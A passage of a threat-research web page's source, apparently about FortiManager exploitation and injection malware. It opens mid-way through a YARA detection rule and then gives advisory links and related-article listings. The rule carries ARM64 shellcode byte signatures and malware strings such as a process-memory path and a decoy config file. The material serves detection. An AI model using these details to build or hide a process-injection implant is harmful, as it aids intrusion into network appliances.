crayon-striped-line" id="crayon-6af9fda0c6b44370535962-24"><span class="crayon-h">      </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">1F</span><span class="crayon-h"> </span><span class="crayon-i">D6</span><span class="crayon-h"> </span><span class="crayon-c">// BR  X0</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-25"><span class="crayon-h">    </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-26"><span class="crayon-h">    </span><span class="crayon-c">// Injection payload entry prologue (.data 0x494048)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-27"><span class="crayon-h">    </span><span class="crayon-c">// ADR+LDUR dispatch -&gt; stack frame 0x110 -&gt; bulk STP register save</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-28"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">injection_entry</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-29"><span class="crayon-h">      </span><span class="crayon-cn">1E</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-c">// ADR X30, #0</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-30"><span class="crayon-h">      </span><span class="crayon-e">DE </span><span class="crayon-i">C3</span><span class="crayon-h"> </span><span class="crayon-cn">40</span><span class="crayon-h"> </span><span class="crayon-i">F8</span><span class="crayon-h"> </span><span class="crayon-c">// LDUR X30, [X30, #0xC]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-31"><span class="crayon-h">      </span><span class="crayon-i">C0</span><span class="crayon-h"> </span><span class="crayon-cn">03</span><span class="crayon-h"> </span><span class="crayon-cn">1F</span><span class="crayon-h"> </span><span class="crayon-i">D6</span><span class="crayon-h"> </span><span class="crayon-c">// RET</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-32"><span class="crayon-h">      </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-33"><span class="crayon-h">      </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-34"><span class="crayon-h">      </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-35"><span class="crayon-h">      </span><span class="crayon-i">FF</span><span class="crayon-h"> </span><span class="crayon-cn">43</span><span class="crayon-h"> </span><span class="crayon-cn">04</span><span class="crayon-h"> </span><span class="crayon-i">D1</span><span class="crayon-h"> </span><span class="crayon-c">// SUB SP, SP, #0x110</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-36"><span class="crayon-h">      </span><span class="crayon-i">E0</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-i">F9</span><span class="crayon-h"> </span><span class="crayon-c">// STR X0, [SP, #0x18]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-37"><span class="crayon-h">      </span><span class="crayon-i">E1</span><span class="crayon-h"> </span><span class="crayon-cn">0B</span><span class="crayon-h"> </span><span class="crayon-cn">02</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X1, X2, [SP, #0x20]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-38"><span class="crayon-h">      </span><span class="crayon-i">E3</span><span class="crayon-h"> </span><span class="crayon-cn">13</span><span class="crayon-h"> </span><span class="crayon-cn">03</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X3, X4, [SP, #0x30]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-39"><span class="crayon-h">      </span><span class="crayon-i">E5</span><span class="crayon-h"> </span><span class="crayon-cn">1B</span><span class="crayon-h"> </span><span class="crayon-cn">04</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X5, X6, [SP, #0x40]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-40"><span class="crayon-h">      </span><span class="crayon-i">E7</span><span class="crayon-h"> </span><span class="crayon-cn">23</span><span class="crayon-h"> </span><span class="crayon-cn">05</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X7, X8, [SP, #0x50]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-41"><span class="crayon-h">      </span><span class="crayon-i">E9</span><span class="crayon-h"> </span><span class="crayon-cn">2B</span><span class="crayon-h"> </span><span class="crayon-cn">06</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X9, X10, [SP, #0x60]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-42"><span class="crayon-h">      </span><span class="crayon-i">EB</span><span class="crayon-h"> </span><span class="crayon-cn">33</span><span class="crayon-h"> </span><span class="crayon-cn">07</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X11, X12, [SP, #0x70]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-43"><span class="crayon-h">      </span><span class="crayon-i">ED</span><span class="crayon-h"> </span><span class="crayon-cn">3B</span><span class="crayon-h"> </span><span class="crayon-cn">08</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X13, X14, [SP, #0x80]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-44"><span class="crayon-h">      </span><span class="crayon-i">EF</span><span class="crayon-h"> </span><span class="crayon-cn">43</span><span class="crayon-h"> </span><span class="crayon-cn">09</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X15, X16, [SP, #0x90]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-45"><span class="crayon-h">      </span><span class="crayon-i">F1</span><span class="crayon-h"> </span><span class="crayon-cn">4B</span><span class="crayon-h"> </span><span class="crayon-cn">0A</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X17, X18, [SP, #0xA0]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-46"><span class="crayon-h">      </span><span class="crayon-i">F3</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-h"> </span><span class="crayon-cn">0B</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X19, X20, [SP, #0xB0]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-47"><span class="crayon-h">      </span><span class="crayon-i">F5</span><span class="crayon-h"> </span><span class="crayon-cn">5B</span><span class="crayon-h"> </span><span class="crayon-cn">0C</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X21, X22, [SP, #0xC0]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-48"><span class="crayon-h">      </span><span class="crayon-i">F7</span><span class="crayon-h"> </span><span class="crayon-cn">63</span><span class="crayon-h"> </span><span class="crayon-cn">0D</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X23, X24, [SP, #0xD0]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-49"><span class="crayon-h">      </span><span class="crayon-i">F9</span><span class="crayon-h"> </span><span class="crayon-cn">6B</span><span class="crayon-h"> </span><span class="crayon-cn">0E</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X25, X26, [SP, #0xE0]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-50"><span class="crayon-h">      </span><span class="crayon-i">FB</span><span class="crayon-h"> </span><span class="crayon-cn">73</span><span class="crayon-h"> </span><span class="crayon-cn">0F</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X27, X28, [SP, #0xF0]</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-51"><span class="crayon-h">      </span><span class="crayon-i">FD</span><span class="crayon-h"> </span><span class="crayon-cn">7B</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-i">A9</span><span class="crayon-h"> </span><span class="crayon-c">// STP X29, X30, [SP, #0x100]</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-52"><span class="crayon-h">    </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-53"> </div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-54"><span class="crayon-h">    </span><span class="crayon-c">// Operational strings (.rodata 0x45A600-0x45A678)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-55"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_miglogd</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"/bin/miglogd"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-56"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_iked</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"/bin/iked"</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-57"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_match_ip</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"169.254.0.1"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-58"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_cover_path</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"/tmp/apache2/conf/md-acme.conf"</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-59"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_cover_content</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"#0 certs managed by ACME"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-60"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">s_proc_mem</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"/proc/%d/mem"</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-61"><span class="crayon-h">  </span><span class="crayon-i">condition</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-62"><span class="crayon-h">    </span><span class="crayon-e">uint32</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>==<span class="crayon-h"> </span><span class="crayon-cn">0x464C457F</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-63"><span class="crayon-h">      </span><span class="crayon-sy">$</span><span class="crayon-e">shellcode_template </span><span class="crayon-st">or</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-64"><span class="crayon-h">      </span><span class="crayon-sy">$</span><span class="crayon-e">injection_entry </span><span class="crayon-st">or</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-65"><span class="crayon-h">      </span><span class="crayon-sy">(</span><span class="crayon-cn">4</span><span class="crayon-h"> </span><span class="crayon-e">of</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-e ">s_*</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-66"><span class="crayon-h">    </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-67"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+
+<p></p>
+<h2><a id="post-188095-_5urxey8vevdd"></a>Additional Resources</h2>
+<ul>
+<li><a href="https://www.ic3.gov/CSA/2026/261006.pdf" target="_blank" rel="noopener">FortiBleed Operations Continue Targeting Exposed Systems Leading to Reports of Lockouts</a> — Joint FBI and Secret Service Advisory, October 6, 2026</li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-24-423" target="_blank" rel="noopener">Missing authentication in fgfmsd</a> — FortiGuard Labs PSIRT Advisory</li>
+<li><a href="https://fortiguard.fortinet.com/psirt/FG-IR-26-122" target="_blank" rel="noopener">Path Traversal in CLI</a> - FortiGuard Labs PSIRT Advisory</li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-24-041" target="_blank" rel="noopener">FGFM protocol allows unauthenticated reset of the connection</a> - FortiGuard Labs PSIRT Advisory</li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-24-042" target="_blank" rel="noopener">Weak authentication - FGFM protocol</a> - FortiGuard Labs PSIRT Advisory</li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-26-060" target="_blank" rel="noopener">Administrative FortiCloud SSO authentication bypass</a> - Fortiguard Labs PSIRT Advisory</li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-25-647" target="_blank" rel="noopener">Multiple Fortinet Products' FortiCloud SSO Login Authentication Bypass</a> - FortiGuard Labs PSIRT Advisory</li>
+<li><a href="https://fortinetweb.s3.amazonaws.com/docs.fortinet.com/v2/attachments/6379fbaa-6dda-11ee-a142-fa163e15d75b/FGFM-7.4-Communications_Protocol_Guide.pdf" target="_blank" rel="noopener">Communications Protocol Guide, FortiGate / FortiManager 7.4</a> - Fortinet</li>
+<li><a href="https://www.fortinet.com/blog/psirt-blogs/analysis-of-sso-abuse-on-fortios" target="_blank" rel="noopener">Fortinet Analysis of Single Sign-On Abuse on FortiOS</a> - Fortinet Blog</li>
+</ul>
+      
+              </div>
+              
+              
+              
+			<div class="be__tags-wrapper"> 
+				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/apache/" role="link" title="Apache" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:Apache">Apache</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/cl-sta-0954/" role="link" title="CL-STA-0954" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:CL-STA-0954">CL-STA-0954</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/logging/" role="link" title="logging" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:logging">Logging</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/network-intrusion/" role="link" title="network intrusion" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:network intrusion">Network intrusion</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/network-sniffer/" role="link" title="Network Sniffer" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:Network Sniffer">Network Sniffer</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/payload/" role="link" title="payload" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:payload">Payload</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/reverse-shells/" role="link" title="reverse shells" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:reverse shells">Reverse shells</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/vpn/" role="link" title="VPN" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:tags:VPN">VPN</a></li></ul>
+			</div> 
+              <div class="be__post-nav">
+    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:article-nav:Threat Research Center"> 
+        <span>Threat Research Center</span>
+    </a>
+            <a class="next" href="https://unit42.paloaltonetworks.com/noise-inside-network-third-party-risk/" role="link" title="The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:article-nav:The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk"> 
+            <span>Next: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk</span>
+        </a>
+    </div>
+ 
+            </div>
+            <div class="be__nav">
+            <div class="be__nav-wrapper">
+      <div class="be-table-of-contents" data-toc-track="fortimanager-cve-2024-47575-peerstitch-malware:sidebar:table-of-contents">
+      <div class="be-title__wrapper">
+        <h3>Table of Contents</h3>
+      </div> 
+            <ul>
+        <li>
+      </ul>
+    </div>
+   
+        <div class="be-related-articles">
+        <h3>Related Articles</h3>
+        <ul> 
+                        <li>
+                  <a href="https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:sidebar:related-articles:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors">
+                      Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors                  </a>
+              </li>
+                            <li>
+                  <a href="https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:sidebar:related-articles:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities">
+                      “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities                  </a>
+              </li>
+                            <li>
+                  <a href="https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:sidebar:related-articles:AI-Powered Espionage Campaign Targets Government Linux Infrastructure">
+                      AI-Powered Espionage Campaign Targets Government Linux Infrastructure                  </a>
+              </li>
+                      </ul>
+      </div>
+      </div> 
+            </div>
+          </div>
+        </div>
+          <div class="pa related-threat">
+    <div class="l-container">
+      	      <h2>Related Malware Resources</h2>
+      <div class="blog-slider" id="blogSlider"> 
+                    <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-11-12T15:00:31+00:00">November 12, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors">
+                    <h4 class="post-title">Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/api/" title="API" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors:API">API</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/deepseek/" title="DeepSeek" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors:DeepSeek">DeepSeek</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/exploits/" title="exploits" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors:exploits">Exploits</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/" title="Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-11-11T15:00:23+00:00">November 11, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/falcon-c2-browser-compromise/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar">
+                    <h4 class="post-title">The XG Files: Falcon C2 Flying Under The (Browser) Radar</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/adobe-flash-player/" title="Adobe Flash Player" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar:Adobe Flash Player">Adobe Flash Player</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/browser-extension/" title="browser extension" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar:browser extension">Browser extension</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/cryptographic/" title="cryptographic" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar:cryptographic">Cryptographic</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/falcon-c2-browser-compromise/" title="The XG Files: Falcon C2 Flying Under The (Browser) Radar" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The XG Files: Falcon C2 Flying Under The (Browser) Radar:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised:High Profile Threats"><span class="">High Profile Threats</span></a>                        <span class="post-pub-date"><time datetime="2026-10-22T17:15:32+00:00">October 22, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/emudhra-certificate-compromise/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised">
+                    <h4 class="post-title">EMudhra Intermediate CA Certificates Compromised</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/certificates/" title="certificates" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised:certificates">Certificates</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/compromise/" title="Compromise" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised:Compromise">Compromise</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/cryptographic/" title="cryptographic" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised:cryptographic">Cryptographic</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/emudhra-certificate-compromise/" title="EMudhra Intermediate CA Certificates Compromised" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:EMudhra Intermediate CA Certificates Compromised:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-10-21T14:00:24+00:00">October 21, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities">
+                    <h4 class="post-title">“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/api/" title="API" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities:API">API</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/data-exfiltration/" title="data exfiltration" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities:data exfiltration">Data exfiltration</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/deepseek/" title="DeepSeek" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities:DeepSeek">DeepSeek</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/" title="“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:“Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-10-15T22:00:09+00:00">October 15, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure">
+                    <h4 class="post-title">AI-Powered Espionage Campaign Targets Government Linux Infrastructure</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
